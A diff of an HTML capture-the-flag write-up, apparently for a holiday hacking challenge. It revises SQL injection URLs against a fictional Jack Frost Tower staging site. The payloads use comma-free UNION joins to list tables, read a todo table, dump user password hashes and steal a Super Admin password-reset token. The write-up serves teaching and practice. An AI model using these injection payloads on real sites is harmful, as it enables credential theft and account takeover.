@@ -46,7 +46,7 @@ It was found that a valid session is also set, if you complete the <a href="http
 Furthermore it is important to note that “union” requires that the <strong>number of columns on both sides match</strong>.<br>
 Due to the fact, that the <code>union</code> database has 7 columns, it has to be ensured, that also on the right hand side of the <code>union</code> 7 columns have to be delivered.</p>
 <p>This URL is the base for all following SQLi attacks:</p>
-<pre><code>https://staging.jackfrosttower.com/detail/461,id union
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union
 </code></pre>
 <p>During research a <a href="https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/">very good explanation</a> about how to avoid commas in SQL statements and how to get to the right amount of columns was found and the attacks outlined below follow exactly this approach.</p>
 <h3 id="getting-access-to-jack-frosts-todo-list">Getting access to Jack Frosts todo list</h3>
@@ -54,7 +54,7 @@ Due to the fact, that the <code>union</code> database has 7 columns, it has to b
 <pre><code>select table_name from information_schema.tables;
 </code></pre>
 <p>This can be rewritten for our SQLi flaw:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>This reveals, that in addition to the tables <code>emails</code> and <code>uniquecontact</code>, which are known as they are used in the application and in the provided schema of encontact <code>encontact_db.sql</code>, there is an additional table <code>todo</code>, which seems to be the todo list we need access to.</p>
 <p>Using the SQL statement</p>
@@ -62,14 +62,14 @@ Due to the fact, that the <code>union</code> database has 7 columns, it has to b
 </code></pre>
 <p>the list of columns in the table <code>todo</code> can be obtained.<br>
 This can be rewritten for the SQLi as follows:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>we can see, that this table consists out of 3 columns: <code>id</code>, <code>note</code>, <code>completed</code>.<br>
 The <code>note</code> column can then be extracted using</p>
 <pre><code>select note from todo
 </code></pre>
 <p>Rewritten for the SQLi:</p>
-<pre><code>select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 </code></pre>
 <p>This brings up Jack Frosts todo list:</p>
 <ul>
@@ -86,7 +86,7 @@ The <code>note</code> column can then be extracted using</p>
 <hr>
 <h3 id="bonus-getting-super-admin-privileges-in-the-application">Bonus: Getting Super Admin privileges in the application</h3>
 <p>Using the SQLi flaw, a full list of registered users and admins (along with password hashes and privilege levels) can be retrieved using this link:</p>
-<pre><code>https://staging.jackfrosttower.com/detail/461,id%20union%20select%20*%20from%20users--
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from users--
 </code></pre>
 <p>This contains for example:</p>
 <ul>
@@ -107,30 +107,9 @@ The <code>note</code> column can then be extracted using</p>
 </ul>
 <p>This shows, that we have a “Super Admin” with the email address root@localhost defined in the system.</p>
 <p>Next the “<a href="https://staging.jackfrosttower.com/forgotpass">forgot password</a>” function of the application can be used to increase the privileges.<br>
-When resetting the password for a user, a random token is created and stored in the user database. If we are able to get hold of this token, we can change the password of the user and have full control.</p>
-<p>The token for “root@localhost” can be retrieved using this URL:</p>
-<pre><code>https://staging.jackfrosttower.com/detail/-1,-id%20union%20select%20*%20from%20(select%201)a%20join%20(select%202)b%20join%20(select%203)c%20join%20(select%20F.7%20from%20(select%20*%20from%20(select%201)h%20join%20(select%202)i%20join%20(select%203)j%20join%20(select%204)k%20join%20(select%205)l%20join%20(select%206)m%20join%20(select%207)n%20union%20select%20*%20from%20users%20where%20email=%22root@localhost%22)F)d%20join%20(select%204)e%20join%20(select%20%222021-01-01%2000:00:00%22)f%20join%20(select%20%222021-01-01%2000:00:00%22)g;--
-</code></pre>
-<p>The timestamps in the above URL are required, as the values of these columns undergo a date conversion. This throws an exception if no valid date format is supplied:</p>
-<pre><code>TypeError: /app/webpage/detail.ejs:29
-    27|                             -
-    28|                         &lt;% }else { %&gt;
- &gt;&gt; 29|                             &lt;%= dateFormat(encontact.date_update, "mmmm dS, yyyy h:MM:ss") %&gt;
-    30|                         &lt;% } %&gt;                     
-    31|                         &lt;/li&gt;
-    32|                     &lt;/ul&gt;
-
-Invalid date
-    at Object.dateFormat (/app/node_modules/dateformat/lib/dateformat.js:39:17)
-    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), &lt;anonymous&gt;:45:26)
-    at Array.forEach (&lt;anonymous&gt;)
-    at eval (eval at compile (/app/node_modules/ejs/lib/ejs.js:618:12), &lt;anonymous&gt;:21:18)
-    at returnedFn (/app/node_modules/ejs/lib/ejs.js:653:17)
-    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:251:36)
-    at View.exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:482:10)
-    at View.render (/app/node_modules/express/lib/view.js:135:8)
-    at tryRender (/app/node_modules/express/lib/application.js:640:10)
-    at Function.render (/app/node_modules/express/lib/application.js:592:3)
+When resetting the password for a user, a random token is created and stored in the user database in the column <code>token</code>. If we are able to get hold of this token, we can change the password of the user and have full control.</p>
+<p>The token for the Super Admin “root@localhost” can be retrieved using this URL:</p>
+<pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a join (select 2)b join (select 3)c join (select token from users where email="root@localhost")d join (select 4)e join (select 5)f join (select 6)g;--
 </code></pre>
 <p>Using the URL <a href="https://staging.jackfrosttower.com/forgotpass/token/">https://staging.jackfrosttower.com/forgotpass/token/</a>{retrieved token} it is possible to set a new password for the “Super Admin” user.<br>
 Being logged on as this user, a new personalized user with “Super Admin” privileges can be created.</p>
